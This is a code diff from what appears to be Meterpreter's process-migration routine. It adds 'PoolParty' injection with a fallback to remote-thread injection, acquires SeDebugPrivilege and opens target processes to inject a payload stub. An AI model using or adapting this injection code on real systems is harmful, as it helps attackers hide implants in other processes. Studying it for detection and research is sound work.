@@ -539,8 +539,8 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 	MetsrvConfig* config = NULL;
 	DWORD configSize = 0;
-
-	BOOL bStealth = FALSE;
+	
+	BOOL bPoolParty = FALSE;
 	DWORD dwProcessAccess;
 	do
 	{
@@ -570,31 +570,28 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s", dwProcessID, dwDestinationArch == 2 ? "x64" : "x86");
 		dprintf("[MIGRATE] Attempting to migrate. PayloadLength=%d StubLength=%d", dwPayloadLength, dwMigrateStubLength);
 
-		bStealth = support_stealth_injection(dwDestinationArch);
+		bPoolParty = supports_poolparty_injection(dwMeterpreterArch, dwDestinationArch);
 
-		if(TRUE) {
-			if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+		if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+		{
+			TOKEN_PRIVILEGES priv = { 0 };
+
+			priv.PrivilegeCount = 1;
+			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+			if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
 			{
-				TOKEN_PRIVILEGES priv = { 0 };
-
-				priv.PrivilegeCount = 1;
-				priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-				if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
+				if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
 				{
-					if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
-					{
-						dprintf("[MIGRATE] Got SeDebugPrivilege!");
-					}
+					dprintf("[MIGRATE] Got SeDebugPrivilege!");
 				}
-
-				CloseHandle(hToken);
 			}
+
+			CloseHandle(hToken);
 		}
+
 		dwProcessAccess = PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
-		if (TRUE) {
-			dwProcessAccess |= PROCESS_CREATE_THREAD;
-		}
+		dwProcessAccess |= PROCESS_CREATE_THREAD;
 
 		hProcess = OpenProcess(dwProcessAccess, FALSE, dwProcessID);
 
@@ -679,7 +676,17 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 		free(ctx);
 
-		if (FALSE) {
+		if (bPoolParty) {
+			dwResult = inject_via_poolparty(remote, response, hProcess, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS;
+			if (dwResult != ERROR_SUCCESS){
+				// If we fail injecting with poolparty, we reset the dwResult and  set the bPoolParty to FALSE to make the next if-clause true.
+				bPoolParty = FALSE;
+				dwResult = ERROR_SUCCESS;
+				dprintf("[MIGRATE] inject_via_poolparty failed, proceeding with legacy injection.");
+			}
+		}
+
+		if (!bPoolParty) {
 			// First we try to migrate by directly creating a remote thread in the target process
 			if (inject_via_remotethread(remote, response, hProcess, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
 			{
@@ -693,11 +700,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 			}
 		}
 		else {
-			if (inject_via_poolparty(remote, response, hProcess, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
-			{
-				SetLastError(ERROR_ACCESS_DENIED);
-				BREAK_WITH_ERROR("[MIGRATE] inject_via_poolparty failed", ERROR_INVALID_FUNCTION);
-			}
+			
 		}
 	} while (0);
 
